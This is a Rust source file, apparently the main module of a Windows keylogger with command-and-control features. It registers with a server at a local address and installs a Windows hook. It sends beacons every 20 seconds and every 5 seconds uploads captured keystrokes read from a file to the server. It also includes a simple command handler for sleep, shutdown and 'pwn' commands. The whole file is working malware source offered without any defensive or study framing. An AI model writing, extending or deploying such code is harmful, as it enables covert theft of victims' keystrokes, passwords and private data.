mod server;
mod system;
use std::{sync::Arc};
use system::{get_windows_version, read_file, set_windows_hook};
use tokio::time::{Duration, sleep};


macro_rules! unwrap_or_panic {
    ($expr: expr) => {
        match $expr{
            Ok(res) =>{
                res
            },
                Err(e) => {panic!("Couldn't connect to server {}", e)
            }
        }   
    };
}

#[tokio::main]
async fn main() {
    const URL: &'static str  = "http://127.0.0.1:5000";

    
    let server = Arc::new(server::Connection::new(&URL));

    let arch = get_windows_version();

    let id: String = unwrap_or_panic!(server.register(arch).await);

    let server_clone = Arc::clone(&server);
    let id_clone = id.clone();

    tokio::spawn(async move {

        unsafe {
            set_windows_hook();
        }
    });

    tokio::spawn(async move {

        loop {
            server_clone.becon(&id_clone).await;
            sleep(Duration::from_secs(20)).await; 
        }
    });





    loop{
        // Execute Commands
        // let rec = unwrap_or_panic!(server.get_command(&id).await);
        // execute_command(&rec).await; 
        // sleep(Duration::from_secs(10)).await;
        let keys = read_file();
        server.send_data(&id, &keys.clone()).await;
        sleep(Duration::from_secs(5)).await;
    }
    
        


    
}


async fn execute_command(cmd: & str){
    // if cmd == "" {""}
    println!("Executing");
    let cmds: Vec<_> = cmd.split([':']).collect();
    println!("{}",cmds[0] == "slp");

    match cmds[0]{
        "slp" => {
            print!("sleeping");
            sleep(Duration::from_secs(cmds[1].parse().unwrap())).await;

        },
        "shd" => {

            std::process::exit(1);
        },
        "pwn" => {

            println!("{}",cmds[1]);
        },
        _ => {}
    };

}
